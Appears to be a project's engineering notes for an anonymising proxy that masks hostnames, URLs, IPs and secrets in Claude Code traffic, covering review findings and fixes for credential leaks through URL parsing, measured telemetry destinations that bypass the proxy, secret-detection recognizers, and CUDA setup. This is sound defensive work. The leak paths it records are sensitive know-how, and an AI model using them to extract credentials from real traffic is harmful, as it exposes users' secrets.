- Unicode NFC in canonicalisation (`café` composed ≡ decomposed) — Cyrillic
  homoglyphs stay DISTINCT, otherwise two real values would share a surrogate.
- Audit log: `allow` entries are now traced by truncated SHA-256 fingerprint
  (post-incident chronology without copying the activity).
- Phase 4 proof: unique marker per run (`ANONPROXY_DENY_MARKER`) instead of a
  grep on keywords the model's prose could satisfy.
- Property corpus extended to 10,300 values: dense IPv6, public IPs, hosts
  outside `.internal`, very short and very long names, JSON escapes, Unicode,
  strict prefixes, UUIDs of various versions, MACs in all three notations.
- Anti-complacency guard in `test_proxy_e2e.py`: the fake detector FAILS loudly
  if it does not cover a fixture value, instead of turning the test green for
  the wrong reason.

**Documented residual**: allocation depends on insertion order for surrogates
that collide on draw — brought down from **40 % to ~4 %** by composing two
words on the first attempt. No practical effect (a project has one vault,
created once); it matters for the reproducibility of a vault rebuild. Bounded
by `test_ordre_d_insertion_effet_borne`.

## Second adversarial review (2026-08-02, after /simplify)

Flaws found AFTER two review passes — all fixed, all with regression tests in
`tests/test_review_regressions.py`:
- **CRITICAL — URL password in clear.** `_fake_authority` split on the first
  colon: `https://alice:password@real.host/` gave `alice` as the host and
  copied `:password@real.host` as the port. The password AND the real domain
  left. RFC 3986 applied; credentials are now treated as secrets (D4).
- **CRITICAL — token restorable through the vault.** A repository URL carrying
  a token (`https://oauth2:ghp_…@github.com/org/repo`) stored the token in the
  `real` column: it became restorable again, breaching D4. Userinfo is stripped
  before canonicalisation.
- **CRITICAL — unregistered URL host.** `_fake_authority` called `_fake_host`
  directly, outside the vault: the surrogate stayed free and ANOTHER real host
  could obtain it → restoration pointed at the wrong machine (D6). It now goes
  through `substitute_value`.
- **MAJOR — URL fragment (`#…`) never substituted**: treated as a `name=value`
  pair, hence ignored. `#tenant-acme-nda` went out in clear.
- **MAJOR — IPv6 without brackets**: everything after the first colon was
  copied as is.
- **MAJOR — a URL reduced to a host got its own identity**, hence two fictional
  machines for one real server.
- **MODERATE — a lexicon word could coincide with a word in the real value**
  (`gateway-021` → `gateway-registry-021`, ~2 % of cases): the draw now avoids
  words present in the input.
- **Complacent tests**: the FakeDetector guard accepted PARTIAL coverage
  (`c in real`) — a weakened e-mail pattern let `alice.dupont` leak without any
  test complaining; the overlap assertion looked for a single substring; the
  unique-identity test forgot the URL type. All three hardened, plus assertions
  on PARTIAL leaks.

**Regression introduced then fixed during those fixes**: unifying the bare host
brought two vault entries into conflict for one surrogate (`https://x` vs
`https://x/`, spans with truncation points) — a 503 mid-session, caught by
`phase3_e2e.sh` and not by the unit tests. That is the argument for keeping
real E2E proofs.

## Accepted deviations for jo to validate

- **Cloud allowlist tightened vs §6 of the plan**: a literal `*.amazonaws.com`
  let `db-prod.cluster-abc123.eu-west-3.rds.amazonaws.com` leak (a RESOURCE
  endpoint, carrying the account identifier). Only the form
  `<service>[.<region>].<cloud>` is allowlisted. Measured by `corpus_eval.py`.
- **`SERVICE` (cyber model) classified PUBLIC**: it fires massively on
  technical prose. To be reassessed on the real corpus.
- **Shared attributes excluded from the restoration view**: otherwise a
  hallucinated surrogate (`canyon-02-prod.<known zone>`) was partially resolved
  into `canyon-02-prod.<REAL zone>` — a fictional host disguised as a real one
  (D5).

## Phase 0 findings (2026-08-01) — updated 2026-08-02

- **Datadog**: on 2026-08-01, ~343 KB were going to
  `http-intake.logs.us5.datadoghq.com` (statsig feature flag
  `tengu_log_datadog_events`, ~15 s flush). On 2026-08-02,
  `tests/datadog_probe.sh` catches nothing — but **that is not proof**: jo has
  since set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`,
  `DISABLE_TELEMETRY=1`, `DISABLE_ERROR_REPORTING=1` and `DO_NOT_TRACK` in the
  Claude Code settings. Claude Code injects those variables regardless of the
  script's environment, so the probe ran with telemetry ALREADY off. Tenable
  conclusion: the switch works. The CONTENT of the payloads remains
  uninspected. To measure it some day, those variables must be neutralised at
  the settings level (`--settings` on a temporary file), not in the
  environment. Datadog is deliberately ABSENT from `known_destinations.json`:
  its reappearance must FAIL the guard.
- **Four destinations out of five escape the proxy** (measured):
  `mcp-proxy.anthropic.com` ×12, `mcp.context7.com` ×11, `registry.npmjs.org`
  ×4, `api.githubcopilot.com` ×2 — against `api.anthropic.com` ×5, which is the
  only channel 1. Detail and firewall policy: `docs/d9-network-isolation.md`.
- `mcp-proxy.anthropic.com` (claude.ai Gmail/Calendar/Drive connectors) does
  NOT go through `ANTHROPIC_BASE_URL` → it escapes the Phase 3 proxy.
  Channel-2 surface, handled by PreToolUse in Phase 4.
- `api.githubcopilot.com` = the remote MCP server of the official github plugin.
- Telemetry also goes THROUGH `api.anthropic.com`
  (`/api/event_logging/…`, `/api/claude_cli/bootstrap`…) → in Phase 3 the proxy
  only rewrites `/v1/messages` and `count_tokens`; the rest passes through and
  stays watched by this harness.
- Harness limit: explicit proxy (`HTTPS_PROXY`) — a process using raw sockets
  bypasses it; the definitive answer is D9 (firewall, Phase 6).

## AnonShield integration notes (Phase 1 — API read 2026-08-01)

- Upstream pinned at `d82f917` (2026-07-27), cloned into
  `services/anonshield/upstream/` (gitignored) from `.repos/anonshield`.
  Wrapper: `services/anonshield/wrapper/` (GPL-3.0), port 9000, `run.sh`.
- **Master secret**: AnonShield natively supports pointing at a key FILE
  through the environment, and that takes precedence over the inline variable.
  `run.sh` persists it in the state directory (0600) and NEVER prints it. Back
  up that directory: the secret and the store are the two halves.
- **Chosen API path**: `AnonymizationOrchestrator(strategy_name="filtered",
  transformer_model=…)` then `.analyzer_engine.analyzer_engine.analyze()` (the
  internal presidio `AnalyzerEngine` — the only path that returns SCORES).
  `regex` mode (large volumes): `EntityDetector.extract_regex_entities()`, no
  NER at all. Entity perimeter: `get_supported_entities("filtered")` = custom
  types plus the model's mapping, NOT the presidio builtins (false positives).
- **Traps**: (1) `import src.anon.config` reads the secret AT IMPORT → run.sh
  sets the environment FIRST; (2) `orchestrator.detect_entities()` does not
  return scores and skips texts with no entities → do not use it; (3)
  `engine.py` patches `HFTokenPipe` at import (sliding window >400 tokens) —
  the warm-up must pass a long text to warm that path; (4) fastapi/uvicorn are
  NOT in the base deps and torch is pinned CPU in the lock →
  `wrapper/install-cuda.sh` after EVERY `uv sync`/`uv run` inside `upstream/`
  (uv run re-syncs the lock!); launch the service via `.venv/bin/python`
  directly only (run.sh). This also avoids celery/redis/pt_core from the web
  group.
- SecureModernBERT mapping: DOMAIN→HOSTNAME, IPV4/6→IP_ADDRESS,
  MD5/SHA1/SHA256→HASH, FILEPATH→FILE_PATH, plus ORG/LOC/EMAIL/URL/CVE….
- Supplied regex recognizers covering the future SECRET class (Phase 2):
  `AUTH_TOKEN`, `JWT`, `PRIVATE_KEY_PEM`, `PASSWORD_CONTEXT`, `COOKIE_SESSION`,
  `CERT_*`, `RSA_MODULUS`, `PGP_BLOCK`.
- Config on NEUTRAL ground: `config/allowlist.txt` (§6, exact plus `re:`
  full-match) and `config/custom_patterns.json` (synthetic examples — the REAL
  conventions get written with jo, preferably after Phase 3). Both the
  detection service AND the surrogate engine read them: "this token is public"
  is maintained in one place. The PARSER is duplicated on either side of the D7
  boundary (ten lines, versus a licence dependency) — it is the list that
  matters, not the code that reads it.

## Phase 1 latency — RESOLVED (2026-08-02, jo's decision: option a, reboot + CUDA)

- History: on CPU the <150 ms criterion was unreachable (fp32 ~800 ms, int8
  567 ms, spaCy 22 ms — about 6× short). The reboot fixed the NVIDIA driver
  mismatch; RTX 4090 Laptop 16 GB operational.
- **Documented, scripted CUDA deviation**: `wrapper/install-cuda.sh` installs
  torch 2.13.0+cu130 (`--reinstall` is mandatory: otherwise uv considers the
  lock's +cpu wheel satisfactory) plus fastapi/uvicorn.
- **Critical uv trap**: `uv sync` AND `uv run` (implicit sync) restore the
  lock's CPU wheels and remove fastapi/uvicorn → re-run `install-cuda.sh` after
  any `uv sync`/`uv run` inside `upstream/`; the service starts ONLY via
  `.venv/bin/python` directly (run.sh does this).
- The cu128 index has no torch 2.13.0; cu130/cu129/cu126 do (driver 580 = CUDA
  13 family → cu130 chosen).
- Final result: P95 100.6 ms (min 94.5 / p50 99.3 / max 101.5) on 2 KB, 30
  requests, stability 99.6/97.6 ms between halves; regex 2.1 ms; load 12.3 s
  (HF cache).
- Notable fact (to reassess in Phase 5): on synthetic log text the raw NER
  returns 0 entities — ALL detections come from the regex recognizers. The
  cost/value ratio of the model on infrastructure logs remains to be measured
  on the golden corpus.

## Environment (surveyed 2026-08-01, updated 2026-08-06)

uv 0.11.32 · Python 3.12.3 · node 24 · claude 2.1.220 · Go 1.26 · devbox 0.17.5
· kubectl + kind + docker present · mitmproxy via `uv tool install mitmproxy`.
Phase 0 had no pyproject (stdlib only); uv packaging arrived with Phases 1-2;
the Go module lives in `go/` and is driven by the Taskfile.
